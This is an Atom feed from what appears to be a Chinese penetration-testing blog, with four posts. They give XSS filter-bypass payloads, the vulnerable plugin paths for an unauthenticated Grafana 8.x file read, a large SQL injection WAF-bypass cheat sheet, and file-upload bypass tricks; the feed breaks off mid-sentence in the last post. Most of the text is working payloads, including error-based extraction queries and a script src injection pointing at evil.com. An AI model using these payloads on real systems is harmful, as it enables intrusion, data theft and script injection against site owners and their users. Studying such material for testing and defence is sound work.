<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jokong的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-12-12T05:45:28.738Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Jokong</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XSS绕过常规姿势 + payload</title>
    <link href="http://yoursite.com/2021/12/12/XSS%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF-payload/"/>
    <id>http://yoursite.com/2021/12/12/XSS%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF-payload/</id>
    <published>2021-12-12T04:16:04.000Z</published>
    <updated>2021-12-12T05:45:28.738Z</updated>
    
    <content type="html"><![CDATA[<p>XSS绕过常规姿势+payload</p><a id="more"></a><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="单引号过滤绕过"><a href="#单引号过滤绕过" class="headerlink" title="单引号过滤绕过"></a>单引号过滤绕过</h4><p>在我们的单引号之前放置了一个“\”，有时候双引号之前也会放置，通<br>过一些类似 add_slashes 的函数可以实现，这个就是转义字符，我们先前的代码就会变成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;INPUT type=&quot;text&quot; value=&apos;\&apos;&gt;&lt;SCRIPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCRIPT&gt;&apos;&gt;</span><br></pre></td></tr></table></figure><p>有一些方法可以继续，但是要看过滤的那个函数是怎么放的了。其中一个方法就是使用字符实体，学过 html<br>的都知道，就是一些特殊字符会用一些固有的符号组合来表示，举个例子，你不能用&lt;&gt;表示大于和小于，<br>因为这被解释为 html 标签，但是，你如果要用，可以用下面的来代替。<br>    &#34;    &quot;    “    双引号<br>    &#38;    &amp;    &amp;    &amp;符号<br>    &#60;    &lt;    &lt;    小于号<br>    &#62;    &gt;    &gt;    大于号<br>使用<code>&amp;quot</code>;或者<code>&amp;#34</code>;<br>来代替我们的双引号，有时候可以绕过过滤</p><p><strong>例子:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(&amp;quot;XSS&amp;quot;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(&amp;#38;XSS&amp;#38;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果这都被过滤了。那我们可以使用 JavaScript 的 fromCharCode 函数，这个函数把指定的 Unicode值转换成字符串</p><p><strong>例子</strong></p><pre><code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code></pre><h4 id="lt-SCRIPT-gt-过滤绕过"><a href="#lt-SCRIPT-gt-过滤绕过" class="headerlink" title="&lt;SCRIPT&gt;过滤绕过"></a><code>&lt;SCRIPT&gt;</code>过滤绕过</h4><p>有些过滤器会过滤到<code>&lt;script&gt;</code>标签，那上面的例子就都废了，但是。还是有方法插入 javascript 的。我们看看事件处理器的例子。</p><pre><code>&lt;BODY onload=&quot;alert(&apos;XSS&apos;)&quot;&gt;</code></pre><p>在 html 里啊。这个 Onload 关键字就是一个事件，其他的所有标签都没有这个属性，但是 Body 标签是有的。但是，有一定的局限性，如果 onload 事件在你的代码之前已经被处理了。那就不会触发了。。不过我们可以继续看看 onerror 事件处理。</p><pre><code>&lt;IMG SRC=&quot;&quot; onerror=&quot;alert(&apos;XSS&apos;)&quot;&gt;&lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;&lt;/img&gt;</code></pre><p>注意看，图片没有指定，也就是出错了。Onerror 这个事件就会发茶。引发 XSS 漏洞，没有用<code>&lt;script&gt;</code><br>标签哦。</p><p>如果是把<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>标签过滤掉，那么可以用</p><pre><code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;</code></pre><h4 id="Input-标签属性绕过"><a href="#Input-标签属性绕过" class="headerlink" title="(Input)标签属性绕过"></a>(Input)标签属性绕过</h4><pre><code>&lt;INPUT type=&quot;text&quot; value=&apos;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;&gt;</code></pre><p><strong>闭合<code>&lt;input&gt;</code></strong></p><pre><code>&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;</code></pre><p>现在我们的代码执行了。因为我们闭合了前面的 html 标签，就触发了 XSS，但是，你可能会发现，页面上会显示一个多出来的单引号，为什么，因为后面的那个原来的单引号没有匹配，我们继续修改我们的代码。</p><pre><code>&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&lt;xss a=&apos;</code></pre><p>所有的输入就会变成这样：</p><pre><code>&lt;INPUT type=&quot;text&quot; value=&apos;&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&lt;xss a=&apos;&apos;&gt;</code></pre><p>Javascript 代码就注入了。<code>&lt;xss a=”&gt;</code>这个没什么意义，你可以自己改，但是符合 html 的标准，<br>页面不会出错。</p><h4 id="大小写混用绕过"><a href="#大小写混用绕过" class="headerlink" title="大小写混用绕过"></a>大小写混用绕过</h4><pre><code>&lt;iMgSRC = &quot;JavaScript:alert(0);&quot;&gt;</code></pre><p>不使用引号或者构造全角字符也能扰乱过滤规则</p><p>还有像CSS中/**/会被浏览器忽略，\和\0同样或被浏览器忽略，同样可以用来绕过：</p><pre><code>&lt;img src =&quot;java/*javascript:alert(‘xss‘)*/script:alert(1);&quot;&gt;</code></pre><h4 id="magic-quotes-gpc绕过"><a href="#magic-quotes-gpc绕过" class="headerlink" title="magic_quotes_gpc绕过"></a><code>magic_quotes_gpc</code>绕过</h4><pre><code>&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt;</code></pre><h4 id="分号引号过滤绕过"><a href="#分号引号过滤绕过" class="headerlink" title="分号引号过滤绕过"></a>分号引号过滤绕过</h4><pre><code>&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</code></pre><h4 id="括号被过滤绕过"><a href="#括号被过滤绕过" class="headerlink" title="括号被过滤绕过"></a>括号被过滤绕过</h4><p>当括号被过滤的时候可以使用throw来绕过</p><pre><code>&lt;a onmouseover=&quot;javascript:window.onerror=alert;throw 1&gt;&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;</code></pre><p>以上两个测试向量在Chrome跟IE在上面会出现一个“uncaught”的错误，可以用以下的向量：</p><pre><code>&lt;body/onload=javascript:window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&gt;</code></pre><h4 id="被过滤时绕过"><a href="#被过滤时绕过" class="headerlink" title="= ( ) ; :被过滤时绕过"></a>= ( ) ; :被过滤时绕过</h4><pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;// 通杀所有浏览器</code></pre><p>opera中可以不闭合</p><pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40 1&amp;#41 // Opera可查</code></pre><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><strong>js中的三种弹框分别是alert()，confirm()，prompt()</strong></p><pre><code>十进制值                           URL编码                              介绍              47                                %2F                                正斜杠              13                                %0D                                回车              12                                %0C                                分页符              10                                %0A                                换行              9                                  %09                               水平制表符            </code></pre><p><img src="/2021/12/12/XSS%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF-payload/1.png" alt="1"></p><p><img src="/2021/12/12/XSS%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF-payload/2.png" alt="1"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XSS绕过常规姿势+payload&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Grafana 未授权任意文件读取</title>
    <link href="http://yoursite.com/2021/12/12/Grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    <id>http://yoursite.com/2021/12/12/Grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</id>
    <published>2021-12-12T04:09:10.000Z</published>
    <updated>2021-12-12T04:12:03.266Z</updated>
    
    <content type="html"><![CDATA[<p>Grafana 未授权任意文件读取</p><a id="more"></a><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>Grafana 8.x API 存在任意文件读取漏洞，未经授权的攻击者可利用该漏洞读取目标服务器任意文件，可导致服务器敏感信息泄漏，目前最新版还没有修复。</p><h3 id="存在问题的插件"><a href="#存在问题的插件" class="headerlink" title="存在问题的插件"></a>存在问题的插件</h3><p>/public/plugins/alertlist/<br>/public/plugins/annolist/<br>/public/plugins/barchart/<br>/public/plugins/bargauge/<br>/public/plugins/candlestick/<br>/public/plugins/cloudwatch/<br>/public/plugins/dashlist/<br>/public/plugins/elasticsearch/<br>/public/plugins/gauge/<br>/public/plugins/geomap/<br>/public/plugins/gettingstarted/<br>/public/plugins/grafana-azure-monitor-datasource/<br>/public/plugins/graph/<br>/public/plugins/heatmap/<br>/public/plugins/histogram/<br>/public/plugins/influxdb/<br>/public/plugins/jaeger/<br>/public/plugins/logs/<br>/public/plugins/loki/<br>/public/plugins/mssql/<br>/public/plugins/mysql/<br>/public/plugins/news/<br>/public/plugins/nodeGraph/<br>/public/plugins/opentsdb<br>/public/plugins/piechart/<br>/public/plugins/pluginlist/<br>/public/plugins/postgres/<br>/public/plugins/prometheus/<br>/public/plugins/stackdriver/<br>/public/plugins/stat/<br>/public/plugins/state-timeline/<br>/public/plugins/status-history/<br>/public/plugins/table/<br>/public/plugins/table-old/<br>/public/plugins/tempo/<br>/public/plugins/testdata/<br>/public/plugins/text/<br>/public/plugins/timeseries/<br>/public/plugins/welcome/<br>/public/plugins/zipkin/<br><img src="/2021/12/12/Grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/gr.png" alt="1"></p><h3 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h3><p>配置访问控制策略，仅允许白名单地址访问，避免Grafana资产在互联网暴露。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Grafana 未授权任意文件读取&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入绕过常规姿势</title>
    <link href="http://yoursite.com/2021/12/12/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF/"/>
    <id>http://yoursite.com/2021/12/12/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF/</id>
    <published>2021-12-12T03:58:10.000Z</published>
    <updated>2021-12-12T04:06:16.185Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入绕过常规姿势</p><a id="more"></a><h4 id="过滤and-or"><a href="#过滤and-or" class="headerlink" title="过滤and or"></a>过滤and or</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">or     ——&gt;    ||</span><br><span class="line">and     ——&gt;    &amp;&amp;</span><br><span class="line">xor——&gt;|   </span><br><span class="line">not——&gt;!</span><br><span class="line"></span><br><span class="line">十六进制绕过</span><br><span class="line">or ——&gt; o\x72</span><br><span class="line"></span><br><span class="line">大小写绕过</span><br><span class="line">Or</span><br><span class="line">aNd</span><br><span class="line"></span><br><span class="line">双写绕过</span><br><span class="line">oorr</span><br><span class="line">anandd</span><br><span class="line"></span><br><span class="line">urlencode，ascii(char)，hex，unicode编码绕过</span><br><span class="line">    一些unicode编码举例：</span><br><span class="line">    单引号：&apos;</span><br><span class="line">    %u0027 %u02b9 %u02bc</span><br><span class="line">    %u02c8 %u2032</span><br><span class="line">    %uff07 %c0%27</span><br><span class="line">    %c0%a7 %e0%80%a7</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">关键字内联注释尝试绕所有</span><br><span class="line">/*!or*/</span><br><span class="line">/*!and*/</span><br></pre></td></tr></table></figure><h4 id="左括号过滤"><a href="#左括号过滤" class="headerlink" title="左括号过滤"></a>左括号过滤</h4><pre><code>urlencode，ascii(char)，hex，unicode编码绕过%u0028 %uff08%c0%28 %c0%a8%e0%80%a8</code></pre><h4 id="右括号过滤"><a href="#右括号过滤" class="headerlink" title="右括号过滤"></a>右括号过滤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlencode，ascii(char)，hex，unicode编码绕过</span><br><span class="line">%u0029 %uff09</span><br><span class="line">%c0%29 %c0%a9</span><br><span class="line">%e0%80%a9</span><br></pre></td></tr></table></figure><h4 id="过滤union-select"><a href="#过滤union-select" class="headerlink" title="过滤union\select"></a>过滤union\select</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">例：</span><br><span class="line">过滤代码 union select user,password from users</span><br><span class="line">绕过方式 1 &amp;&amp; (select user from users where userid=1)=&apos;admin&apos;</span><br><span class="line"></span><br><span class="line">十六进制字符绕过</span><br><span class="line">select ——&gt; selec\x74</span><br><span class="line">union——&gt;unio\x6e</span><br><span class="line"></span><br><span class="line">大小写绕过</span><br><span class="line">SelEct</span><br><span class="line"></span><br><span class="line">双写绕过</span><br><span class="line">selselectect</span><br><span class="line">uniunionon</span><br><span class="line"></span><br><span class="line">urlencode，ascii(char)，hex，unicode编码绕过</span><br><span class="line"></span><br><span class="line">关键字内联绕所有</span><br><span class="line">/*!union*/</span><br><span class="line">/*!select*/</span><br></pre></td></tr></table></figure><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">用Tab代替空格%20 %09 %0a %0b %0c %0d %a0 /**/()</span><br><span class="line">绕过空格注释符绕过//--%20/**/#--+-- -;%00;</span><br><span class="line"></span><br><span class="line">空白字符绕过SQLite3  ——     0A,0D,0c,09,20</span><br><span class="line">MYSQL</span><br><span class="line">09,0A,0B,0B,0D,A0,20</span><br><span class="line">PosgressSQL</span><br><span class="line">0A,0D,0C,09,20</span><br><span class="line">Oracle_11g</span><br><span class="line">00,0A,0D,0C,09,20</span><br><span class="line">MSSQL</span><br><span class="line">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,OF,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</span><br><span class="line">特殊符号绕过</span><br><span class="line">`  +  ！</span><br><span class="line">等科学计数法绕过</span><br><span class="line">例：</span><br><span class="line">select user,password from users where user_id0e1union select 1,2</span><br><span class="line">unicode编码</span><br><span class="line">    %u0020 %uff00</span><br><span class="line">    %c0%20 %c0%a0 %e0%80%a0</span><br></pre></td></tr></table></figure><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤="></a>过滤=</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or 1 like 1#可以绕过对 = &gt; 等过滤</span><br><span class="line">or &apos;1&apos; IN (&apos;1234&apos;)#可以替代=</span><br></pre></td></tr></table></figure><h4 id="过滤比较符-lt-gt"><a href="#过滤比较符-lt-gt" class="headerlink" title="过滤比较符&lt;&gt;"></a>过滤比较符&lt;&gt;</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select*fromuserswhereid=1and ascii(substr(database(),0,1))&gt;64</span><br><span class="line">select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure><h4 id="过滤where"><a href="#过滤where" class="headerlink" title="过滤where"></a>过滤where</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 1 &amp;&amp; (select user from users where user_id = 1) = &apos;admin&apos;</span><br><span class="line">绕过方式 1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos;</span><br></pre></td></tr></table></figure><h4 id="过滤limit"><a href="#过滤limit" class="headerlink" title="过滤limit"></a>过滤limit</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos;</span><br><span class="line">绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos;#user_id聚合中user_id为1的user为admin</span><br></pre></td></tr></table></figure><h4 id="过滤group-by"><a href="#过滤group-by" class="headerlink" title="过滤group by"></a>过滤group by</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos;</span><br><span class="line">绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1</span><br></pre></td></tr></table></figure><h4 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1</span><br><span class="line">绕过方式 1 &amp;&amp; substr(user,1,1) = &apos;a&apos;</span><br></pre></td></tr></table></figure><h4 id="过滤’-单引号"><a href="#过滤’-单引号" class="headerlink" title="过滤’(单引号)"></a>过滤’(单引号)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">waf = &apos;and|or|union|where|limit|group by|select|\&apos;&apos;</span><br><span class="line">过滤代码 </span><br><span class="line">1 &amp;&amp; substr(user,1,1) = &apos;a&apos;</span><br><span class="line">绕过方式 </span><br><span class="line">1 &amp;&amp; user_id is not null1 &amp;&amp; substr(user,1,1) = 0x611 &amp;&amp; substr(user,1,1) = unhex(61)</span><br><span class="line">宽字节绕过 </span><br><span class="line">%bf%27 %df%27 %aa%27</span><br></pre></td></tr></table></figure><h4 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</span><br><span class="line">selectsubstr(database(0from1for1);selectmid(database(0from1for1);</span><br><span class="line"></span><br><span class="line">对于limit可以使用offset来绕过：</span><br><span class="line"></span><br><span class="line">select*fromnews limit0,1# 等价于下面这条SQL语句select*fromnews limit1offset0</span><br></pre></td></tr></table></figure><h4 id="过滤hex"><a href="#过滤hex" class="headerlink" title="过滤hex"></a>过滤hex</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br><span class="line">绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br></pre></td></tr></table></figure><h4 id="过滤substr"><a href="#过滤substr" class="headerlink" title="过滤substr"></a>过滤substr</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">逻辑绕过</span><br><span class="line">过滤代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) </span><br><span class="line">绕过方式 1 &amp;&amp; lpad(user(),1,1) in &apos;r&apos;</span><br></pre></td></tr></table></figure><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>利用urlencode，ascii(char)，hex，unicode等编码绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</span><br><span class="line"></span><br><span class="line">十六进制编码</span><br><span class="line">SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</span><br><span class="line"></span><br><span class="line">双重编码绕过</span><br><span class="line">?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+</span><br></pre></td></tr></table></figure><h4 id="等价函数或变量"><a href="#等价函数或变量" class="headerlink" title="等价函数或变量"></a>等价函数或变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line">@@user ==&gt; user()</span><br><span class="line">@@datadir ==&gt; datadir()</span><br><span class="line">举例：substring()和substr()无法使用时：?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74　</span><br><span class="line">或者：</span><br><span class="line">substr((select &apos;password&apos;),1,1) = 0x70</span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x69) = 1</span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x70) = 0</span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x71) = -1</span><br></pre></td></tr></table></figure><h4 id="生僻函数"><a href="#生僻函数" class="headerlink" title="生僻函数"></a>生僻函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’);　　　　</span><br><span class="line">?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line">SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror));　//postgresql</span><br><span class="line">?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br><span class="line">and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1))</span><br><span class="line">and extractvalue(1, concat(0x5c, (select user()),0x5c))</span><br></pre></td></tr></table></figure><h4 id="N绕过"><a href="#N绕过" class="headerlink" title="\N绕过"></a>\N绕过</h4><p>\N相当于NULL字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0</span><br><span class="line">select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0</span><br><span class="line">select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0</span><br></pre></td></tr></table></figure><h4 id="PCRE绕过"><a href="#PCRE绕过" class="headerlink" title="PCRE绕过"></a>PCRE绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP 的 pcre.backtrack_limit 限制利用</span><br><span class="line">union/*aaaaaaaxN*/select</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL注入绕过常规姿势&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>文件上传绕过常规姿势</title>
    <link href="http://yoursite.com/2021/12/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF/"/>
    <id>http://yoursite.com/2021/12/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF/</id>
    <published>2021-12-12T03:27:34.000Z</published>
    <updated>2021-12-12T03:56:32.784Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传绕过常规姿势</p><a id="more"></a><h4 id="前端JS限制文件后缀"><a href="#前端JS限制文件后缀" class="headerlink" title="前端JS限制文件后缀"></a>前端JS限制文件后缀</h4><p>限制只能上传规定后缀文件，绕过方式：</p><p>1.禁用检测文件后缀的JS代码</p><p>2.上传正常格式文件，抓包修改文件的filename为脚本格式</p><h4 id="Content-type限制"><a href="#Content-type限制" class="headerlink" title="Content-type限制"></a>Content-type限制</h4><p>后台校验上传文件的Content-type是否为指定值，绕过方式：</p><p>1.上传时抓包修改Content-type</p><p>2.上传正常格式文件，抓包修改文件的filename为脚本格式</p><h4 id="文件后缀黑名单检测限制"><a href="#文件后缀黑名单检测限制" class="headerlink" title="文件后缀黑名单检测限制"></a>文件后缀黑名单检测限制</h4><p>1.大小写绕过，例如黑名单中为.php，那么可以上传.PHP或者.Php来绕过黑名单</p><p>2.“. ”“_”号和空格绕过，（只适用于Windows系统）Windows系统下，文件名后缀最后一个“.”“_”和空格会被自动去除，例如黑名单为.php，那么可以上传.php.，.php_或者.php 